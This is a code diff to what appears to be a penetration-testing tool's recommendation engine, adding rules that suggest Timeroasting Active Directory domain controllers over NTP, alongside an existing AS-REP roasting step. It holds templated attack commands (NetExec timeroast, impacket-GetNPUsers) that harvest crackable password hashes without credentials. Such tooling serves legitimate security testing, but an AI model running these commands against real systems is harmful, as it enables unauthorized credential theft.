@@ -204,9 +204,36 @@ export function getRecommendedSteps(target: Target): Recommendation[] {
         commandPreview: "impacket-GetNPUsers '{{DOMAIN|corp.local}}/' -usersfile users.txt -format hashcat -outputfile asrep.hashes -dc-ip {{TARGET}} -no-pass",
       });
     }
+
+    if (!isCompleted('kerb-timeroast') && !isCompleted('ntp-timeroast-nxc')) {
+      recommendations.push({
+        id: 'rec-timeroast',
+        title: 'Timeroasting (MS-SNTP Authentication Roasting)',
+        description: 'Query the Domain Controller Windows Time Service (W32Time) over UDP port 123 to extract crackable MS-SNTP MD5 authentication digests with zero credentials.',
+        playbookId: 'kerberos',
+        stepId: 'kerb-timeroast',
+        priority: 'high',
+        reason: 'Active Directory Domain Controller detected; Timeroasting works without valid credentials.',
+        commandPreview: "nxc smb {{TARGET}} -u '' -p '' -M timeroast",
+      });
+    }
   }
 
-  // --- RULE 8: SMB RECONNAISSANCE (PORTS 139, 445) ---
+  // --- RULE 8: NTP / TIME SERVICE (PORT 123) ---
+  if (openPorts.includes(123) && !isCompleted('ntp-timeroast-nxc') && !isCompleted('kerb-timeroast')) {
+    recommendations.push({
+      id: 'rec-ntp-timeroast',
+      title: 'Timeroasting (W32Time NTP Roasting)',
+      description: 'Query Windows Time Service (W32Time) on UDP port 123 using NetExec or timeroast.py to extract MS-SNTP password digests.',
+      playbookId: 'ntp',
+      stepId: 'ntp-timeroast-nxc',
+      priority: 'high',
+      reason: 'Port 123 NTP open; Domain Controller time service can be roasted for offline NTLM password cracking.',
+      commandPreview: "nxc smb {{TARGET}} -u '' -p '' -M timeroast",
+    });
+  }
+
+  // --- RULE 9: SMB RECONNAISSANCE (PORTS 139, 445) ---
   if ((openPorts.includes(445) || openPorts.includes(139)) && !isCompleted('smb-null-session')) {
     recommendations.push({
       id: 'rec-smb-null',
